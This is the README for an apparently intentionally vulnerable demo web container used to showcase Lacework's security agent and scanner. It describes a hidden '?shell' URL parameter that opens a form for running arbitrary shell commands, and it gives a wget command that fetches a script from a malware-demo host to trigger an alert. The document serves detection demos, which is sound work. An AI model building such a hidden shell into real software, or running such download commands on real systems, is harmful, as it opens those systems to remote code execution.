# lacework-demo-app

Simple web demo application with vulnerabilities (couple of low, medium and high) OS and python vulnerabilites).
The image also includes the Lacework agent which can be started by setting the environment variable `LaceworkAgentEnabled=true`.

This image is hosted publicly and can be pulled like this:

```shell
docker pull ghcr.io/timarenz/lacework-demo-app:latest
```

When running this container make sure you map port `5000` (thats where the web app is listening on) and that the environment variables `LaceworkAccessToken` and `LaceworkServerUrl` are set to connect the Lacework agent running in this container to your Lacework account.

The container contains tools like `curl`, `wget`, `jq` and a full blown `bash` shell.

When accessing the application you see a single website and a random cocktail on the lower left side.
With every page load the app reads a random cocktail from `https://www.thecocktaildb.com` to simulate outgoing traffic to an external external host.

In addition if you load the page with the `?shell` parameter, like `http://<IPorFQDN>:5000/?shell` a small terminal icon will apear on the lower left.
Clicking this will open a form that allows you to run shell commands within the container to simluate a "RCE".

A simple example is running `wget  http://lwmalwaredemo.com/install-demo-1.sh` which triggers a critical alert in Lacework.

Make sure you use the [Lacework inline scanner](https://docs.lacework.com/integrate-inline-scanner) to manually upload the image evulation results to you Lacework account.

```shell
lw-scanner image evaluate ghcr.io/timarenz/lacework-demo-app latest --save
```

This gives you more visibility in the vulnerabilities view.
